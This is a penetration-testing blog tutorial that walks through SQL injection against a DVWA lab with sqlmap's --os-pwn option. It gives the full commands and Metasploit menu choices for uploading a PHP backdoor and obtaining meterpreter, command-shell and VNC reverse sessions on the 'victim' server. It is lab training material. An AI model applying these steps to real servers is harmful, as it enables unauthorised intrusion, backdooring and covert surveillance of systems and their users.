<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/database-hacking/" rel="category tag">Database Hacking</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Exploiting the Webserver using Sqlmap and Metasploit (OS-Pwn)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/exploiting-webserver-using-sqlmap-metasploit-os-pwn/" rel="bookmark"><time class="entry-date published" datetime="2017-01-08T06:50:09+00:00">January 8, 2017</time><time class="updated" datetime="2025-05-25T10:14:23+00:00">May 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This article is about how to use sqlmap for SQL injection to hack victim pc and gain shell access. Here I had performed SQL attack to gain three different types of the shell (meterpreter, command shell and VNC )</span></p>
<h3><span style="color: #800000;">Requirement:</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Xampp/Wamp Server                                                                                                           </strong></span></li>
<li><span style="color: #000000;"><strong>DVWA Lab</strong></span></li>
<li><span style="color: #000000;"><strong>Kali Linux: Burp suite, sqlmap tool </strong></span></li>
</ul>
<p><span style="color: #000000;">Very first you need to install DVWA lab in your XAMPP or WAMP server, read full article from<strong> </strong><a style="color: #000000;" href="https://www.hackingarticles.in/web-application-lab-setup-on-windows/"><strong>here</strong></a></span></p>
<h3><span style="color: #800000;">Logging into DVWA and Setting Security Level</span></h3>
<p><span style="color: #000000;">Now open the DVWA in your pc and login with following credentials:</span></p>
<p><span style="color: #000000;"><strong>Username</strong> – admin</span></p>
<p><span style="color: #000000;"><strong>Password</strong> – password</span></p>
<p><span style="color: #000000;">Click on <strong>DVWA Security</strong> and set Website <strong>Security Level low</strong></span></p>
<p><span style="color: #000000;">From the list of vulnerabilities select <strong>SQL Injection</strong> for your attack. Type <strong>user ID: 1</strong> in text box.  Don’t click on submit button without setting browser proxy. Set your browser proxy to make burp suite work properly.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-orC-lMaJJg8/WHHZ_nZy6RI/AAAAAAAAO3A/9iAUHHHxzZYijT8QUhQa3n_M49C_kBiFgCLcB/s640/1.png"/></p>
<h3><span style="color: #800000;">Capturing Request and Extracting Cookies</span></h3>
<p><span style="color: #000000;">Let’s start out SQLMap to Metasploit OS exploitation.</span></p>
<p><span style="color: #000000;">Turn on burp suite click on <strong>the proxy </strong>in the menu bar and go <strong>for intercept is on the button</strong>. Come back and click on <strong>submit</strong> button in dvwa. Burp suit will provide” cookie” and “referrer” under fetched data which will be used later in sqlmap commands.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-MwawwLUduyk/WHHaCDh0f4I/AAAAAAAAO3U/jvWwWSpe5k45vbOOKWRCRcbe-FwCi_YdACLcB/s1600/2.png"/></p>
<p><span style="color: #000000;">Let’s enumerate all databases name using “referrer and cookies” under sqlmap command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u "http://192.168.1.79:81/dvwa/vulnerabilities/sqli/?id=1&amp;submit=submit" --cookie="security=low; PHPSESSID=jgs556oh1j1n8pc1ea0ovmeed47" --dbs</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-ymF5McoDN5Q/WHHaDBbtgmI/AAAAAAAAO3Y/mF3XmdRhFMULhSKtkv_MmPePm1wdd2XhgCLcB/s640/3.png"/></p>
<p><span style="color: #000000;">It has dumped all names of the database. Now I am going to choose dvwa to access its back-end database management system.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-9VgX3HijwHI/WHHaDXrm-cI/AAAAAAAAO3c/pnasj9wIC0AstENYaGo25QPyUoiDwbOZwCLcB/s1600/4.png"/></p>
<p><span style="color: #000000;">Now type the following command to access shell of the web server and follow the screenshot.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u "http://192.168.1.79:81/dvwa/vulnerabilities/sqli/?id=1&amp;submit=submit" --cookie="security=low; PHPSESSID=jgs556oh1j1n8pc1ea0ovmeed47" -D dvwa --os-pwn</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-hzbfFRTo_S8/WHHaEeaF1jI/AAAAAAAAO3g/ScjQDkTlkxg-x0iO69ajRLexsXzVncaKACLcB/s640/5.png"/></p>
<h3><span style="color: #800000;">Choosing Payload and Uploading Backdoor</span></h3>
<p><span style="color: #000000;">Type<strong> 1</strong> for <strong>Metasploit framework</strong> to establish a reverse connection then<strong> </strong><strong>type</strong><strong> 4</strong> for <strong>php</strong> payload for supporting server and again <strong>type</strong><strong> 1 </strong>for <strong>the common location</strong> <strong>for the writable directory</strong> to upload payload as a backdoor in victim PC.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-3ZL24OZqhZM/WHHaFMO1ipI/AAAAAAAAO3k/6-sG_Ln9XG0tCWWfvWrQhu-JrEHke8RwgCLcB/s640/6.png"/></p>
<p><span style="color: #000000;">Here Type<strong> 1 </strong>for <strong>reverse tcp </strong>connection as the default option. Now I will choose these entire three payloads one by one and try to hack web server every time. Now type<strong> 1</strong> for meterpreter.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-ZLrzo-VoRRY/WHHaF8C3BwI/AAAAAAAAO3o/rGXAwwysqdo4Lf5GMWCu95Vb3RMSgQ98gCLcB/s640/7.png"/></p>
<h4><span style="color: #800000;">Shell 1: Meterpreter Session</span></h4>
<p><span style="color: #000000;">It will load the Metasploit framework and provides meterpreter session 1.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-m6tkxqBCXlA/WHHaHGrH3nI/AAAAAAAAO3s/e5WMJqKBZlkqcw3AeqC8W4VyyTtSKW2hACLcB/s640/8.png"/></p>
<h4><span style="color: #800000;">Shell 2: Command Shell Session</span></h4>
<p><span style="color: #000000;">Repeat the whole process till <strong>reverse tcp connection</strong> when further it asks to choose payload, then <strong>type 2</strong> for <strong>the shell.</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-iEZWNe3lzD8/WHHaHVIe2FI/AAAAAAAAO3w/12vjnHcnowkHaG6NfgMTes9XxNzQtShuACLcB/s640/9.png"/></p>
<p><span style="color: #000000;">Then it will load the Metasploit framework and provides command shell session 1.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-Qs70w1gqhx4/WHHaAawhqSI/AAAAAAAAO3I/W5DQrxbGWfwJ32C6C100Y1118GK3SiouACLcB/s640/10.png"/></p>
<h4><span style="color: #800000;">Shell 3: VNC Viewer Access</span></h4>
<p><span style="color: #000000;">Repeat the whole process till <strong>reverse tcp connection</strong> when further it asks to choose payload, this time now <strong>type 3</strong> for <strong>VNC.</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-jaUpczP1IZ8/WHHaAAkqC5I/AAAAAAAAO3E/bnEWcN_nCEIiQRGnFmn4KjeSYFK16sDcwCLcB/s640/11.png"/></p>
<p><span style="color: #000000;">Again it will load the Metasploit framework and launching viewer.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-ininB7SLKOs/WHHaBTMnB7I/AAAAAAAAO3M/4W-lbIddxtcx0MlsZEbKKhS2iMQHsEMdwCLcB/s640/12.png"/></p>
<p><span style="color: #000000;">Finally, you can see from the given screenshot that I had access victim pc through TightVNC and now victims each moment will be kept under my observation. Hence, we have hacked victim pc three times with various type shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5MUGuVYelf0/WHHaBmgz9tI/AAAAAAAAO3Q/EazwGtettD0MN6C3U7TCIavaRnHwUlwCACLcB/s640/13.png"/></span></p>
<p><span style="color: #000000;">Finally we have completed the SQLMap to Metasploit OS exploitation.</span></p>
<p><span style="color: #000000;">To learn more about Database Hacking. Follow this <strong><a href="https://www.hackingarticles.in/category/database-hacking/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
